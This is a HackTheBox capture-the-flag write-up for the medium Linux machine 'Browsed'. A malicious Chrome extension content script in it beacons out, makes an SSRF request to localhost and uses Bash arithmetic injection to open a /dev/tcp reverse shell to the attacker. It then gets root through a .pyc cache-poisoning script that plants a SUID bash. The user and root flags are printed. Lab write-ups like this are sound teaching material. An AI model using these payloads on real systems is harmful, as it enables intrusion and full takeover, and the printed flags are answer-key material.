# HackTheBox — Browsed

**Difficulty:** Medium
**OS:** Linux
**Points:** 30
**IP:** `10.129.255.67`

---

## Attack Chain Summary

```
nmap → port 80 (nginx)
  └─ Chrome extension upload portal
       └─ Malicious content.js → code exec in developer's browser
            └─ SSRF via fetch() → 127.0.0.1:5000
                 └─ Bash arithmetic injection in /routines/
                      └─ Reverse shell as larry
                           └─ sudo -l → NOPASSWD on extension_tool.py
                                └─ World-writable __pycache__
                                     └─ .pyc poisoning → root
```

---

## Reconnaissance

```bash
nmap -sC -sV -oN browsed.nmap 10.129.255.67
```

```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
```

Two ports. SSH is a dead end without credentials. Everything lives on port 80.

Add both vhosts to `/etc/hosts`:

```bash
echo "10.129.255.67 browsed.htb browsedinternals.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

Browsing to `http://browsed.htb` reveals a Chrome extension upload portal. A developer reviews and installs submitted extensions. The `/samples.html` page lists three demo extensions available for download.

```bash
wget http://browsed.htb/fontify.zip
unzip fontify.zip -d fontify/
```

Extension structure:

```
fontify/
├── content.js
├── manifest.json
├── popup.html
├── popup.js
└── style.css
```

Key section of `manifest.json`:

```json
{
  "manifest_version": 3,
  "permissions": ["storage", "scripting"],
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"],
    "run_at": "document_idle"
  }]
}
```

`"matches": ["<all_urls>"]` means `content.js` executes on every page the developer visits — including `http://localhost`. This is the attack surface.

---

## Initial Foothold

### Step 1 — Confirm Code Execution

Replace `fontify/content.js` with a beacon:

```javascript
const C2 = "10.10.14.31";
new Image().src = `http://${C2}/ping?t=${Date.now()}`;
```

Repackage and start a listener:

```bash
cd fontify && zip -r ../fontify.zip . && cd ..
python3 -m http.server 80
```

Upload `fontify.zip` via `http://browsed.htb/upload.php`. Incoming request confirms execution:

```
10.129.255.67 - - "GET /ping?t=1773933441742 HTTP/1.1" 404 -
```

Code execution confirmed inside the developer's browser.

---

### Step 2 — SSRF

The extension runs inside the developer's browser, inheriting its network access — including localhost. Update `content.js` to probe `127.0.0.1:5000`:

```javascript
const C2 = "10.10.14.31";
fetch("http://127.0.0.1:5000/", { mode: "no-cors" })
  .finally(() => {
    new Image().src = `http://${C2}/ssrf?status=hit`;
  });
```

Hit received — live service on `127.0.0.1:5000`, unreachable externally but accessible through the browser's network context.

---

### Step 3 — Bash Arithmetic Injection

The internal Flask app exposes a `/routines/<input>` endpoint. The path parameter is passed unsanitized into a Bash arithmetic expression:

```bash
echo $((user_input))
```

Inside Bash arithmetic, array subscript syntax `a[index]` evaluates the index. Wrapping a command in `$(...)` causes Bash to execute it:

```bash
echo $((a[$(id)]))   # executes id
```

To avoid encoding issues, the reverse shell is base64-encoded and decoded at runtime.

Start a listener:

```bash
nc -lvnp 9001
```

Final `content.js` payload:

```javascript
const C2     = "10.10.14.31";
const TARGET = "http://127.0.0.1:5000/routines/";
const cmd    = `bash -c 'bash -i >& /dev/tcp/${C2}/9001 0>&1'`;
const b64    = btoa(cmd);
const sp     = "%20";
const inject = `a[$(echo${sp}${b64}|base64${sp}-d|bash)]`;
fetch(TARGET + inject, { mode: "no-cors" });
```

Repackage and upload. Shell received:

```
Connection received on 10.129.255.67 46342
larry@browsed:~/markdownPreview$
```

Stabilize:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag

```bash
cat ~/user.txt
```

```
ad2c0d9965b2d0202b89b19144bb3a7a
```

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
(root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

```bash
ls -la /opt/extensiontool/
```

```
-rwxrwxr-x  root root  extension_tool.py
-rw-rw-r--  root root  extension_utils.py
drwxrwxrwx  root root  __pycache__        ← world-writable
```

---

### Python .pyc Cache Poisoning

When Python imports a module, it checks `__pycache__/` for a pre-compiled `.pyc` file before reading the `.py` source. If the `.pyc` exists and its metadata (timestamp + file size) matches the source, Python executes the bytecode directly — no integrity check.

Since `__pycache__/` is world-writable, we can replace the legitimate `.pyc` with a malicious one. When `sudo` runs `extension_tool.py` as root, Python imports `extension_utils`, finds our poisoned bytecode, and executes our payload at root privilege level.

**Exploit script** (`/tmp/poison.py`):

```python
import os, py_compile, shutil

SRC  = "/opt/extensiontool/extension_utils.py"
DEST = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

meta = os.stat(SRC)

evil = '''import os
def validate_manifest(path):
    os.system("cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t")
    return {}
def clean_temp_files(arg):
    pass
'''

# Pad to match original source file size exactly
evil += "#" * (meta.st_size - len(evil))

with open("/tmp/evil_src.py", "w") as f:
    f.write(evil)

# Stamp with original timestamps
os.utime("/tmp/evil_src.py", (meta.st_atime, meta.st_mtime))

# Compile to bytecode
py_compile.compile("/tmp/evil_src.py", cfile="/tmp/evil.pyc")

# Replace the legitimate cache
if os.path.exists(DEST):
    os.remove(DEST)
shutil.copy("/tmp/evil.pyc", DEST)
os.chmod(DEST, 0o666)
print("[+] Cache poisoned")
```

Deploy and trigger:

```bash
python3 /tmp/poison.py
sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

Verify SUID binary was created:

```bash
ls -la /tmp/r00t
# -rwsr-sr-x 1 root root 1446024 /tmp/r00t
```

Pop root:

```bash
/tmp/r00t -p
```

---

## Root Flag

```bash
cat /root/root.txt
```

```
f59e5fd0e1d8566639831c624e261dc6
```

---

## Vulnerabilities Summary

| Stage | Vulnerability | Why It Worked |
|---|---|---|
| Initial Access | Unreviewed extension upload | Developer installed user-submitted code without sandboxing |
| SSRF | Browser-context network trust | Extension shared the developer's localhost access |
| RCE | Bash arithmetic injection | User input evaluated unsanitized inside `$((...))` |
| PrivEsc | World-writable `__pycache__` | Python executes cached bytecode with no integrity check |

---

*thrandomv — HackTheBox | March 2026*
